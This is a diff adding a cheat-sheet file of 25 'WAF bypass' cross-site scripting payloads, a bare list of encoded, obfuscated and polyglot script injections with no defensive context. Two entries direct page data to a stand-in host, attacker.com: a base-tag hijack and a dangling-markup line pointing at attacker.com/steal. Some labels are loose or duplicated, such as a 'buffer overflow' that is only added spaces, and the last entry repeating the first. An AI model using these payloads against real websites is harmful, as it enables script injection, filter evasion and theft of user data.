@@ -1,0 +1,78 @@
+# 25 WAF Bypass Techniques
+
+# 1. Mixed case
+<ScRiPt>alert(1)</ScRiPt>
+
+# 2. Nested tags
+<script<script>>alert(1)</script>
+
+# 3. Unicode encoding
+<\u0073cript>alert(1)</script>
+
+# 4. Hex encoding
+<img src=x onerror=\x61lert(1)>
+
+# 5. Octal encoding
+<svg onload=\141lert(1)>
+
+# 6. Double URL encoding
+%253Cscript%253Ealert(1)%253C/script%253E
+
+# 7. Tab/newline injection
+<scr\tipt>alert(1)</script>
+<scr%0aipt>alert(1)</script>
+
+# 8. Null byte injection
+<scri%00pt>alert(1)</script>
+
+# 9. Polyglot (multiple contexts)
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
+
+# 10. Event handler via CSS
+<img style="x:expression(alert(1))">
+
+# 11. Data URI bypass
+<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+
+# 12. SVG via HTML encoding
+<svg><script>&#97&#108&#101&#114&#116&#40&#49&#41</script></svg>
+
+# 13. HTML encoding in attributes
+<img src=x onerror=&#97&#108&#101&#114&#116&#40&#49&#41>
+
+# 14. HPP (HTTP Parameter Pollution)
+?param=value1&param=<script>alert(1)</script>
+
+# 15. Form content-type bypass
+Content-Type: text/plain -> <script>alert(1)</script>
+
+# 16. Charset bypass
+Content-Type: text/html; charset=utf-7
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+
+# 17. Base tag injection
+<base href=https://attacker.com/>
+
+# 18. Dangling markup
+<img src="https://attacker.com/steal?data=
+
+# 19. JSONP callback
+?callback=<script>alert(1)</script>
+
+# 20. CSS injection
+</style><script>alert(1)</script>
+
+# 21. Comment injection (HTML comment bypass)
+<!--><script>alert(1)</script>
+
+# 22. CDATA bypass (XML/XHTML)
+<![CDATA[><script>alert(1)</script>]]>
+
+# 23. WAF buffer overflow
+< script>alert(1)</script > (with spaces)
+
+# 24. Parameter fragmentation
+?p=1&q=<script>&r=alert(1)&s=</script>
+
+# 25. Case permutation
+<sCrIpT>alert(1)</sCrIpT>
